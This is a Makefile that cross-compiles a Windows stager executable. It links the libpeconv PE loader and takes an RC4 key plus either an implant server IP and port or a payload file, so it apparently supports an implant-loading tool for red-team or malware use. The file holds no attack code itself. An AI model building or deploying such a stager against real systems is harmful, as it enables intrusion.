src_libpeconv = $(wildcard libpeconv/libpeconv/src/*.cpp)
obj_libpeconv = $(src_libpeconv:.cpp=.o)

INC = -Ilibpeconv/libpeconv/include
CFLAGS = -Wno-conversion-null -Wno-pointer-arith
LDFLAGS = -lntdll -static
LDFLAGS2 = -Ldist -l:libpeconv.a -lws2_32
# static linking is needed for cross compiling c++ to windows
# TODO: solve it dynamically in order to reduce stager size

CFLAG_RC4 = 
ifdef RC4_KEY
  CFLAG_RC4 = -DRC4_KEY=\"$(RC4_KEY)\"
endif

ifdef IMPLANT_IP
  CFLAG_SRC = -DIMPLANT_IP=\"$(IMPLANT_IP)\" -DIMPLANT_PORT=$(IMPLANT_PORT)
else
  CFLAG_SRC = -DPAYLOAD_FILE=\"$(PAYLOAD_FILE)\"
endif

CXX_x32 := i686-w64-mingw32-g++
CXX_x64 := x86_64-w64-mingw32-g++
AR_x86 := i686-w64-mingw32-ar
AR_x64 := x86_64-w64-mingw32-ar

check_defined = \
    $(strip $(foreach 1,$1, \
        $(call __check_defined,$1,$(strip $(value 2)))))
__check_defined = \
    $(if $(value $1),, \
        $(error Undefined $1$(if $2, ($2))$(if $(value @), \
                required by target $@)))

stager := dist/stager.exe

.PHONY: all
all: stager

libpeconv/libpeconv/src/%.o: libpeconv/libpeconv/src/%.cpp
	$(CXX_x64) -c $(INC) ${CFLAGS} $< -o $@

dist/libpeconv.a: $(obj_libpeconv)
#	$(CXX_x64) -o dist/libpeconv.dll -shared $^ ${LDFLAGS}
	${AR_x64} rcs dist/libpeconv.a $^

stager/cRC4.o:
	$(CXX_x64) -c stager/cRC4.cpp -o stager/cRC4.o

stager/stager.o:
#	@:$(call check_defined, IMPLANT_IP, implant serving ip)
#	@:$(call check_defined, IMPLANT_PORT, implant serving port)

	$(CXX_x64) -c stager/stager.cpp $(CFLAGS) $(INC) $(CFLAG_SRC) $(CFLAG_RC4) -o stager/stager.o

.PHONY: stager
stager:	$(stager)

$(stager): stager/cRC4.o stager/stager.o dist/libpeconv.a
	$(CXX_x64) stager/*.o $(LDFLAGS) $(LDFLAGS2) -o $(stager)

.PHONY: clean
clean:
	rm -f dist/libpeconv.dll dist/libpeconv.a dist/stager.exe stager/cRC4.o stager/stager.o

.PHONY: cleanall
cleanall: clean
	rm -f libpeconv/libpeconv/src/*.o

